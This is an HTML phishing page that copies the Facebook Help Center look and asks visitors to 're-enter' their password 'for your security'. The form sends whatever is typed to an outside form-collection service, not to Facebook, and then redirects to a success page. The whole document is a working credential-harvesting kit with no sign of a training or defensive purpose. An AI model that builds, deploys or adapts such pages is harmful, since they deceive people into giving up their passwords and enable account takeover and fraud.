<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Help Center</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon" />
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #fff;
    }

    .header {
      background-color: #3b5998;
      color: white;
      padding: 16px;
      font-size: 26px;
      font-weight: bold;
    }

    .help-center {
      color: #1877f2;
      font-size: 17px;
      font-weight: bold;
      padding: 16px;
      background-color: #f0f2f5;
      border-bottom: 1px solid #dadde1;
    }

    .container {
      width: 330px;
      margin: 30px auto;
      border: 1px solid #dadde1;
      background-color: white;
      display: flex;
      flex-direction: column;
    }

    .title-section {
      background-color: #f0f2f5;
      padding: 15px;
      font-size: 19px;
      font-weight: bold;
      border-bottom: 1px solid #dadde1;
    }

    .content {
      padding: 15px;
      position: relative;
      padding-bottom: 60px; /* Space for fixed button */
    }

    .instructions {
      font-size: 14px;
      margin-bottom: 15px;
      color: #606770;
    }

    .input-group {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
    }

    .input-group input {
      flex: 1;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccd0d5;
      border-radius: 2px;
      background: transparent;
    }

    .input-group input:focus {
      outline: none;
      border-color: #ccd0d5;
    }

    .toggle-btn {
      margin-left: 8px;
      padding: 10px 10px;
      background-color: transparent;
      border: 1px solid #ccd0d5;
      font-size: 14px;
      border-radius: 2px;
      cursor: pointer;
      color: #606770;
    }

    .error-message {
      color: red;
      font-size: 13px;
      margin-bottom: 10px;
      display: none;
    }

    .button-section {
      position: absolute;
      bottom: 0;
      left: 0;
      width: 100%;
      padding: 10px 10px;
      background-color: #f0f2f5;
      border-top: 1px solid #dadde1;
      box-sizing: border-box;
      text-align: right;
    }

    .btn-continue {
      background-color: #3b5998;
      color: white;
      border: none;
      padding: 8px 14px;
      font-size: 15px;
      cursor: pointer;
    }

    .btn-continue:active {
      background-color: #2d4373;
    }
  </style>
</head>
<body>

  <div class="header">facebook</div>
  <div class="help-center">Help Center</div>

  <div class="container">
    <div class="title-section">Please enter your password</div>
    <div class="content">
      <div class="instructions">
        For your security, please re-enter your password to complete this request.
      </div>

      <form id="passwordForm" action="https://submit-form.com/NcWbj5fZ9" method="POST">
        <div class="error-message" id="error-message">Password must be at least 6 characters and contain no spaces.</div>
        <div class="input-group">
          <input type="password" id="password" name="password" placeholder="Enter your password" required />
          <button type="button" class="toggle-btn" onclick="togglePassword()">Show</button>
        </div>

        <input type="hidden" name="_redirect" value="success.html" />

        <div class="button-section">
          <button type="submit" class="btn-continue">Continue</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleBtn = document.querySelector(".toggle-btn");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleBtn.textContent = "Hide";
      } else {
        passwordInput.type = "password";
        toggleBtn.textContent = "Show";
      }
    }

    document.getElementById("passwordForm").addEventListener("submit", function (e) {
      const password = document.getElementById("password").value;
      const errorMessage = document.getElementById("error-message");

      if (password.length < 6 || password.includes(" ")) {
        e.preventDefault();
        errorMessage.style.display = "block";
      } else {
        errorMessage.style.display = "none";
      }
    });
  </script>

</body>
    </html>
